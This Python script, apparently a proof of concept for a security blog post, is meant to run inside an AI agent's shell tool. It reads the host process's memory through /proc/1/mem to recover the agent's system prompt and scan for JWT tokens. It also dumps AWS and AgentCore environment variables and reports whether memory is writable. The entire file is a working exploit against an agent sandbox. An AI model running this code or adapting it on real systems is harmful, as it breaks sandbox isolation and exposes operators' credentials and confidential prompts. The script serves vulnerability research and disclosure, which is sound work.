"""Blog demo — /proc/1/mem READ primitive.

Proves the shell-tool-child can read PID 1's entire address space.
Reports: kernel security state, memory layout, system prompt recovery,
environment variables, and credential-shaped bytes (JWTs).

Env:
  SEARCH_PREFIX — first N bytes of the system prompt to search for (optional;
                  if absent, skips prompt scan and only reports kernel state +
                  env vars + JWT scan)

Hosted at github.com/nivmorabin/skills/dict-walk/pid1_mem_read_demo.py
"""
import hashlib
import json
import os
import re
import sys


def kernel_security_state():
    """Check UID match, Yama, seccomp, /proc/1/mem access."""
    result = {}
    shell_uid = os.getuid()
    pid1_status = open('/proc/1/status').read()

    pid1_uid = int(re.search(r'Uid:\s+(\d+)', pid1_status).group(1))
    result['shell_uid'] = shell_uid
    result['pid1_uid'] = pid1_uid
    result['uid_match'] = shell_uid == pid1_uid

    try:
        yama = open('/proc/sys/kernel/yama/ptrace_scope').read().strip()
    except FileNotFoundError:
        yama = 'NOT_LOADED'
    result['yama_ptrace_scope'] = yama

    result['proc1_mem_readable'] = os.access('/proc/1/mem', os.R_OK)
    result['proc1_mem_writable'] = os.access('/proc/1/mem', os.W_OK)

    seccomp = re.search(r'Seccomp:\s+(\d+)', pid1_status)
    result['pid1_seccomp'] = int(seccomp.group(1)) if seccomp else None

    nonewprivs = re.search(r'NoNewPrivs:\s+(\d+)', pid1_status)
    result['pid1_nonewprivs'] = int(nonewprivs.group(1)) if nonewprivs else None

    return result


def memory_layout():
    """Enumerate writable regions from /proc/1/maps."""
    regions = []
    total_writable = 0
    for line in open('/proc/1/maps').readlines():
        m = re.match(r'([0-9a-f]+)-([0-9a-f]+)\s+(\S+)\s+\S+\s+\S+\s+\S+\s*(.*)', line)
        if not m:
            continue
        lo, hi = int(m.group(1), 16), int(m.group(2), 16)
        perms = m.group(3)
        label = m.group(4).strip()
        size = hi - lo
        if 'w' in perms:
            total_writable += size
            if size >= 4096:
                regions.append({
                    'lo': lo, 'hi': hi, 'size': size,
                    'perms': perms, 'label': label or '[anon]',
                })
    return regions, total_writable


def scan_for_prompt(regions, search_prefix):
    """Scan /proc/1/mem for the system prompt bytes."""
    needle = search_prefix.encode('utf-8')
    found = []
    with open('/proc/1/mem', 'rb') as mem:
        for reg in regions:
            if reg['size'] > 50 * 1024 * 1024:
                continue
            try:
                mem.seek(reg['lo'])
                chunk = mem.read(reg['size'])
            except (OSError, OverflowError):
                continue
            idx = -1
            while True:
                idx = chunk.find(needle, idx + 1)
                if idx < 0:
                    break
                addr = reg['lo'] + idx
                snippet = chunk[idx:idx + 80].decode('utf-8', errors='replace')
                found.append({'addr': hex(addr), 'region': reg['label'], 'snippet': snippet})
    return found


def read_environ():
    """Read /proc/1/environ."""
    try:
        raw = open('/proc/1/environ', 'rb').read()
    except Exception as e:
        return {'error': str(e)}
    entries = raw.split(b'\x00')
    env_vars = {}
    for entry in entries:
        if b'=' not in entry:
            continue
        k, v = entry.split(b'=', 1)
        k_str = k.decode('utf-8', errors='replace')
        v_str = v.decode('utf-8', errors='replace')
        if any(k_str.startswith(p) for p in ('AWS_', 'AGENTCORE_', 'PYTHON', 'PATH', 'HOME')):
            env_vars[k_str] = v_str if len(v_str) <= 200 else v_str[:200] + '...'
    return {'total_vars': len(entries) - 1, 'selected_vars': env_vars}


def scan_for_jwts(regions):
    """Scan /proc/1/mem for JWT-shaped byte sequences."""
    jwt_re = re.compile(rb'eyJ[A-Za-z0-9_\-]{20,}\.eyJ[A-Za-z0-9_\-]{20,}\.[A-Za-z0-9_\-]{20,}')
    findings = []
    seen = set()
    with open('/proc/1/mem', 'rb') as mem:
        for reg in regions[:30]:
            if reg['size'] > 50 * 1024 * 1024:
                continue
            try:
                mem.seek(reg['lo'])
                chunk = mem.read(reg['size'])
            except (OSError, OverflowError):
                continue
            for m in jwt_re.finditer(chunk):
                tok = m.group(0)
                if len(tok) < 200:
                    continue
                sha = hashlib.sha256(tok).hexdigest()
                if sha in seen:
                    continue
                seen.add(sha)
                findings.append({
                    'sha256': sha,
                    'length': len(tok),
                    'address': hex(reg['lo'] + m.start()),
                    'region': reg['label'],
                    'head': tok[:32].decode('ascii'),
                })
    return findings


def main():
    search_prefix = os.environ.get('SEARCH_PREFIX', '')

    print('=== KERNEL SECURITY STATE ===')
    ks = kernel_security_state()
    print(f'SHELL_UID={ks["shell_uid"]}')
    print(f'PID1_UID={ks["pid1_uid"]}')
    print(f'UID_MATCH={ks["uid_match"]}')
    print(f'YAMA={ks["yama_ptrace_scope"]}')
    print(f'MEM_READABLE={ks["proc1_mem_readable"]}')
    print(f'MEM_WRITABLE={ks["proc1_mem_writable"]}')
    print(f'SECCOMP={ks["pid1_seccomp"]}')
    print(f'NONEWPRIVS={ks["pid1_nonewprivs"]}')

    print('\n=== MEMORY LAYOUT ===')
    regions, total_writable = memory_layout()
    print(f'WRITABLE_REGIONS={len(regions)}')
    print(f'TOTAL_WRITABLE_MB={total_writable / (1024*1024):.1f}')
    for r in regions[:5]:
        print(f'  REGION {r["perms"]} {r["label"]:30s} {r["size"]/1024:.0f} KB')

    print('\n=== ENVIRONMENT VARIABLES ===')
    env = read_environ()
    if 'error' in env:
        print(f'ENV_ERROR={env["error"]}')
    else:
        print(f'PID1_TOTAL_VARS={env["total_vars"]}')
        for k, v in sorted(env['selected_vars'].items()):
            print(f'  {k}={v[:100]}')

    if search_prefix:
        print('\n=== SYSTEM PROMPT SCAN ===')
        print(f'SEARCH_PREFIX={search_prefix[:40]}')
        found = scan_for_prompt(regions, search_prefix)
        print(f'PROMPT_OCCURRENCES={len(found)}')
        for i, f in enumerate(found[:5]):
            print(f'  HIT[{i}] addr={f["addr"]} region={f["region"]}')
            print(f'    bytes="{f["snippet"]}"')
    else:
        print('\n=== SYSTEM PROMPT SCAN ===')
        print('SKIPPED (set SEARCH_PREFIX env to enable)')

    print('\n=== JWT / CREDENTIAL SCAN ===')
    jwts = scan_for_jwts(regions)
    print(f'UNIQUE_JWTS={len(jwts)}')
    for j in jwts[:5]:
        print(f'  JWT sha256={j["sha256"][:24]}... len={j["length"]} @{j["address"]}')

    print('\n=== DONE ===')
    all_ok = ks['uid_match'] and ks['proc1_mem_readable'] and ks['proc1_mem_writable']
    print(f'PRIMITIVE_LIVE={all_ok}')


if __name__ == '__main__':
    main()
